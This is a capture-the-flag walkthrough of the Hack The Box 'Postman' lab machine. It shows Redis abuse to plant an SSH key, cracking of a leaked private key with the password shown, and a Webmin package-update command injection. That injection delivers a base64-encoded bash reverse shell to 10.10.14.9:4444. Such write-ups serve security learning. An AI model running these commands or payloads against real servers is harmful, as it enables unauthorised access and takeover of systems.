![postman](https://user-images.githubusercontent.com/66635295/177882324-7b24b663-8911-4c1c-81c6-85fbc14f3ea8.png)

**RECON**
---
**Unfinished Website**
![recon](https://user-images.githubusercontent.com/66635295/177882332-fd817d49-3650-4a0b-b8cf-9bd12907a41d.png)

**Nmap Scan**
<pre>nmap –p- -A -T4 10.10.10.160</pre>
-allports -version -Aggressive

Port 6379 Redis and Port 1000 Webpage
![nmap](https://user-images.githubusercontent.com/66635295/177882433-ba2d38f8-69fc-49e7-99ff-10ab7c868bd8.png)

**Webpage check**

Wepbpage shows an error, and the link does not work 
![10000](https://user-images.githubusercontent.com/66635295/177882646-5ebf6232-adf3-4e15-8cdd-b284ba8791f7.png)

Navigating to the proper page reveals Webmin login 
![webmin](https://user-images.githubusercontent.com/66635295/177882796-f0ff7900-9296-4471-b394-01b121af3ef9.png)

**Redis**
<pre> sudo apt-get install redis-tools </pre>
![redis install](https://user-images.githubusercontent.com/66635295/177883042-2adb0cbf-6e2c-44bc-a428-e99c52c57325.png)

Redis Host
<pre>redis-cli -h 10.10.10.160</pre>
![redis-h](https://user-images.githubusercontent.com/66635295/178047298-847ee0b2-b196-4674-ab2e-499e5b6a23fc.png)

Directory Check
<pre>CONFIG GET dir</pre>
<pre> CONFIG SET dir /var/lib/redis/.ssh</pre>
![redis-h](https://user-images.githubusercontent.com/66635295/178054227-24f483cd-851e-4e7d-9feb-120da1f1ff95.png)

**ENUMERATION**
---
**SSH Key**
<pre>ssh-keygen</pre>
![sshgen](https://user-images.githubusercontent.com/66635295/178054662-4469fc0a-1040-438b-9c44-6c62b8568dfc.png)

Copy key to .txt file
<pre> (echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > key.txt  </pre>            
![keytxt](https://user-images.githubusercontent.com/66635295/178055503-d0f774e4-6c69-409a-99cf-c0eac96f8106.png)

Send key to host
<pre>cat key.txt | redis-cli -h 10.10.10.160 -x set ssh_key</pre>
![rkey](https://user-images.githubusercontent.com/66635295/178055971-545373bc-d97d-4ea1-bc7b-07574185d1e4.png)

Check key
<pre>get ssh_key</pre>
![check key](https://user-images.githubusercontent.com/66635295/178056511-f5151520-69fe-4dce-b9e5-8571d4c55139.png)

Set database
<pre>CONFIG SET dir /var/lib/redis/.ssh </pre>
<pre>CONFIG set dbfilename authorized_keys</pre>
<pre>save</pre>
<pre>exit</pre>
![set db](https://user-images.githubusercontent.com/66635295/178056953-a2d34e4d-f7b1-40db-b2ff-c58c8c4db9f3.png)


SSH into the host
<pre> ssh - id_rsa redis@10.10.10.160 </pre>

**Checking  Directorys**

authorized_keys directory is here 

![directory](https://user-images.githubusercontent.com/66635295/178059417-c9d01199-9069-4e64-9c48-840fba1f2d65.png)

Home directory 
<pre>ls -l</pre>
<pre>cd Matt</pre>
<pre>ls -l</pre>
User Matt has read permison for user flag

![matt](https://user-images.githubusercontent.com/66635295/178060409-6bc981cb-aca1-4f61-a78d-4dda178c30a0.png)

Opt Directory
<pre> cat id_rsa.bak </pre>
Reveals Private RSA KEY 


**PRIVILEGE ESCALATION**
---
**John the Ripper**
Copy paste the key and transfer it to .john
<pre> /usr/share/john/ssh2john.py postman_id_rsa_enc > postman_id_rsa.john </pre>
![sshtojohn](https://user-images.githubusercontent.com/66635295/178073942-d24e2b6a-b6c2-4652-8406-c8b7cb4242b2.png)

Cracked Password 
<pre> john postman_id_rsa.johm --wordlist=/usr/share/wordlists/rockyou.txt </pre>
Jonhn and rockyou.txt reveals password to be computer2008

![cracked](https://user-images.githubusercontent.com/66635295/178074216-551f939e-0907-4646-9070-fcedf0739f41.png)

**SSH Matt**
<pre>ssh Matt@10.10.10.160</pre>
Matt is denied permission

![fail matt](https://user-images.githubusercontent.com/66635295/178074458-e94015eb-af59-4635-88ca-d72305f099ae.png)

Checking SSH 
<pre>cd /etc/ssh/</pre>
<pre>ls</pre>
![sshconfig](https://user-images.githubusercontent.com/66635295/178074642-1a9db243-8f0e-4b36-b167-20d7103f491f.png)

reading sshd_config shows Matt is a denied login 

![denny](https://user-images.githubusercontent.com/66635295/178074725-c7d3d884-8855-4f91-aab4-b122591dbe00.png)

Postmatt
<pre> su Matt </pre>
<pre> Password: computer2008 </pre>

![postmatt](https://user-images.githubusercontent.com/66635295/178075034-35d1fd9d-d29c-4def-846f-df32e4c3d510.png)

Flag is now accessible 

![user flag](https://user-images.githubusercontent.com/66635295/178075070-f098c396-939f-4315-8073-d0e6d0a53312.png)

Webin is also accessible via same password

![mattlogin](https://user-images.githubusercontent.com/66635295/178095015-e4c8460d-8f94-4793-a0d4-d45035112b3f.png)

Checking Version shows webin 1.910

![version](https://user-images.githubusercontent.com/66635295/178095064-db2a39be-d321-41b3-9c3c-48097a84a05d.png)

**Root shell**
---
**Vulnearbilty**

CVE 2019-12850 is a severe vulnerability 

![vuln](https://user-images.githubusercontent.com/66635295/178095122-fe3ad733-aa3d-4bda-8e4d-b46ab7dd55a0.png)

Maneuver to Package Updates and turn on Burpsuite interceptor 

![burpon](https://user-images.githubusercontent.com/66635295/178095397-ea80e6f1-a9b4-4ae5-ab8d-8229afeb5fc5.png)

Send package-updates request to the repeater. Clear out some of the extra HTTP and add u=acl%2Fapt&u=$ to execute commands.

![check](https://user-images.githubusercontent.com/66635295/178095579-cd0cffb2-676e-4c12-be58-da3e29e627f1.png)

**Payload** 

Base64
<pre>echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.9/4444 0>&1"'| base64 </pre>
-newline -command_string -interactive_shell standard output TCP connection HOST/LISTENING PORT standard input

![base64](https://user-images.githubusercontent.com/66635295/178096539-257455ab-9507-4c0e-beb6-d6016db08edc.png)

Netcat
<pre> nc -lvp 4444 </pre>
-listen -verbose -port

![netcat](https://user-images.githubusercontent.com/66635295/178096671-66df4f9c-4244-4504-bda1-2382c01f559d.png)

URL Encode
<pre>$(echo${IFS}TCPSTRING|base64${IFS}-d|bash)</pre>
{IFS} prevent command from splitting  -decode

![url](https://user-images.githubusercontent.com/66635295/178096699-4811c722-342f-48be-a4c9-e05f10c36c88.png)


Put payload in the repeater

![payload](https://user-images.githubusercontent.com/66635295/178097240-7bad79e8-c25f-4922-bf62-333b3ce8f9d6.png)

**Shell**

Root Connection on listner

![shell](https://user-images.githubusercontent.com/66635295/178097333-c92dc960-1b42-4656-b3c9-1950676d08f4.png)

Flag in home directory

![rootflag](https://user-images.githubusercontent.com/66635295/178097415-cb60be01-dfa4-4b18-91c7-1510c068e727.png)


